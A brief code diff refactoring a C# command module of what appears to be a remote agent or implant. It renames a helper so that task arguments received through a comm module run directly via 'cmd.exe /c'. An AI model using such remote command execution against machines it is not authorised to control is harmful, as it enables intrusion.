@@ -1,4 +1,4 @@
-﻿using Agent.Commands.Internal;
+﻿using Agent.Internal;
 using Agent.Models;
 using System;
 using System.Collections.Generic;
@@ -16,7 +16,7 @@ namespace Agent.Commands
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
             //cmd.exe /c <command>
-            result.Result = ExecuteHelper.ExecuteCommand(@"c:\windows\system32\cmd.exe", $"/c {task.Arguments}");
+            result.Result = Executor.ExecuteCommand(@"c:\windows\system32\cmd.exe", $"/c {task.Arguments}");
 
         }
     }
